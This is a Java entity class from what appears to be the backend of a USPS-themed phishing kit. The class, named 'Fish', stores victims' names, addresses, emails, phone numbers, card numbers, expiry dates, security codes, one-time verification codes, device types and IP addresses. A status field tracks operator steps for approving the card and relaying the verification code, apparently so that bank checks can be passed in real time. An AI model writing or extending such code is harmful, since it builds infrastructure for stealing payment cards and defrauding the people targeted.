package com.uspsassa.phishing.entity;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Data;

@Schema
@Data
public class Fish {
    /**
     * id
     */
    @Schema(description = "id")
    private Integer id;

    /**
     * socket的id
     */
    @Schema(description = "socket的id")
    private String sid;

    /**
     * 名称
     */
    @Schema(description = "名称")
    private String name;

    /**
     * 地址
     */
    @Schema(description = "地址")
    private String address;

    /**
     * 可选地址
     */
    @Schema(description = "可选地址")
    private String addressOption;

    /**
     * 城市
     */
    @Schema(description = "城市")
    private String city;

    /**
     * 选择框的
     */
    @Schema(description = "邮箱")
    private String email;

    /**
     * 电话号码
     */
    @Schema(description = "电话号码")
    private String phoneNumber;

    /**
     * 卡号
     */
    @Schema(description = "卡号")
    private String cardNumber;

    /**
     * 失效日期
     */
    @Schema(description = "失效日期")
    private String expDate;

    /**
     * 邮政编码
     */
    @Schema(description = "邮政编码")
    private String zipCode;

    /**
     * 安全码
     */
    @Schema(description = "安全码")
    private String securityCode;

    /**
     * 验证码
     */
    @Schema(description = "验证码")
    private String verificationCode;

    /**
     * 状态 --0等待输入卡号 --1等待卡放行 --2等待验证码放行
     */
    @Schema(description = "状态 等待输入卡号 卡放行 等待输入验证码 验证码放行")
    private String status;

    /**
     * 设备类型
     */
    @Schema(description = "设备类型")
    private String deviceType;

    /**
     * IP地址
     */
    @Schema(description = "IP地址")
    private String ip;

    @Schema(description = "创建时间")
    private Long createTime;
}